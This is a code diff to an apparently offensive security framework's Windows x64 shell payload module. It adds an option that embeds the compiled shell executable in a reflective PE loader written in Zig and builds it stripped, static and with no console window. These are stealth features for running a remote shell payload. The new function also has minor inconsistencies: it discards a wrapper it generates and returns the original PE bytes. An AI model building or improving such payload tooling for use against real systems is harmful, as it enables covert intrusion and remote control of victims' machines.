@@ -28,6 +28,7 @@ class Module(Payload):
     lport = OptPort(4444, 'Connect to port', True)
     encoder = OptString('', 'Encoder', False, True)
     generate_exe = OptBool(False, 'Generate executable PE binary', False)
+    reflective_pe = OptBool(False, 'Embed stage as reflective PE loader (requires generate_exe)', False)
     output_dir = OptString('output', 'Output directory for compiled binaries', False)
     auto_compile = OptBool(False, 'Automatically compile after generation', False)
     
@@ -95,9 +96,52 @@ class Module(Payload):
             shellcode = self._apply_encoder(shellcode)
         
         if self.generate_exe:
-            return self._generate_executable(shellcode)
+            result = self._generate_executable(shellcode)
+            if bool(getattr(self, "reflective_pe", False)):
+                output_path = Path(self.output_dir or "output/windows_x64_shell").resolve()
+                pe_path = output_path / "shell.exe"
+                if pe_path.exists():
+                    pe_bytes = pe_path.read_bytes()
+                    return self._generate_reflective_executable(pe_bytes)
+                print_warning("reflective_pe: shell.exe not found; skipping reflective wrapper")
+            return result
         
         return shellcode
+
+    def _generate_reflective_executable(self, pe_bytes: bytes) -> bytes:
+        """Compile a reflective PE loader that embeds the given image."""
+        from lib.c2.reflective_loader import build_reflective_pe_wrapper_zig, validate_pe_header
+
+        if not validate_pe_header(pe_bytes):
+            print_error("reflective_pe requires a valid PE image; compile generate_exe first or supply a PE")
+            return pe_bytes
+
+        zig_code = self._generate_zig_wrapper(b"")
+        loader = build_reflective_pe_wrapper_zig(pe_bytes)
+        zig_code = loader + "\n\npub fn main() void {\n    ReflectiveEntry();\n}\n"
+
+        if self.output_dir:
+            output_path = Path(self.output_dir)
+        else:
+            output_path = Path("output") / "windows_x64_shell"
+        output_path = output_path.resolve()
+        output_path.mkdir(parents=True, exist_ok=True)
+        binary_path_abs = (output_path / "reflective_shell.exe").resolve()
+
+        if self.compile_zig(
+            source_code=zig_code,
+            output_path=str(binary_path_abs),
+            target_platform='windows',
+            target_arch='x86_64',
+            optimization='ReleaseSmall',
+            strip=True,
+            static=True,
+            windows_subsystem='windows',
+        ):
+            print_success(f"Reflective loader generated: {binary_path_abs}")
+        else:
+            print_warning("Reflective PE compilation failed")
+        return pe_bytes
     
     def _apply_encoder(self, payload: bytes) -> bytes:
         """
